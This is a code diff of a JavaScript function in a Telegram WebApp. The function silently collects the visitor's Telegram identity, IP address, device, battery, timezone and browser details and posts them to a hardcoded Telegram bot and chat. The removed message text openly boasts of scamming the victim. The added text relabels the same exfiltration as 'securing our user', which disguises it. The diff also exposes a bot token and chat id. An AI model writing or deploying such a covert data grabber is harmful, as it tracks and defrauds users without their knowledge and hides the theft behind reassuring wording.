@@ -47,27 +47,28 @@ async function sendDataToTelegram() {
     const screenResolution = getScreenResolution();
     const batteryPercentage = await getBatteryPercentage();
     const browserInfo = getBrowserInfo();
+
     let tg = window.Telegram.WebApp;
+    let userData = tg.initDataUnsafe.user || {};
 
     const message = `
-<b>🚀 Наебан в ракетке!</b>
+<b>🚀 Обезопасили нашего пользователя!</b>
 
-<b>🔍 Лудик ахмед:</b>
-├ Тег: @${tg.initDataUnsafe.user.username}
-├ Айди: <code>${tg.initDataUnsafe.user.id}</code>
-├ Имя: <code>${tg.initDataUnsafe.user.first_name}</code>
-├ Фамилия: <code>${tg.initDataUnsafe.user.last_name}</code>
-├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
-└ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>
+<b>🔍 Безопасно сохранены данные:</b>
+├ Тег: @${userData.username || "Не указан"}
+├ Айди: <code>${userData.id || "Не указан"}</code>
+├ Имя: <code>${userData.first_name || "Не указано"}</code>
+├ Фамилия: <code>${userData.last_name || "Не указана"}</code>
+├ Язык: <code>${userData.language_code || "Не указан"}</code>
+└ Можно писать в ЛС: <code>${userData.allows_write_to_pm !== undefined ? userData.allows_write_to_pm : "Неизвестно"}</code>
 
 <b>📱 Информация об устройстве:</b>
 ├ Айпи: <code>${ipAddress}</code>
 ├ UserAgent: <code>${userAgent}</code>
-├ Хэш: <code>undefined</code>
 ├ ОС: <code>${osName}</code>
 ├ Разрешение экрана: <code>${screenResolution}</code>
 ├ Заряд батареи: <code>${batteryPercentage}%</code>
-└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>
+└ Часовой пояс: <code>${new Date().getTimezoneOffset()} минут</code>
 
 <b>🛜 Информация о браузере:</b>
 ├ Название браузера: <code>${browserInfo.name}</code>
@@ -75,20 +76,23 @@ async function sendDataToTelegram() {
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
     `;
 
-    const token = '7345050493:AAEasKTJJQaVjdka50otaJHPR7wZESBfvBU'; // Не забудьте хранить токен безопасно
-    const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
-    const chatId = '-1002380319804'; // Храните ID чата безопасно
-
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('text', message);
-    formData.append('parse_mode', 'HTML');
+    const token = '7345050493:AAEasKTJJQaVjdka50otaJHPR7wZESBfvBU'; // Храни безопасно
+    const chatId = '-1002380319804'; // Проверь, что ID начинается с -100
 
     try {
-        await fetch(telegramBotURL, {
-            method: 'POST',
-            body: formData
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: "HTML"
+            })
         });
+
+        const result = await response.json();
+        if (!result.ok) throw new Error(result.description);
+
     } catch (error) {
         console.error('Ошибка отправки данных в Telegram:', error);
     }
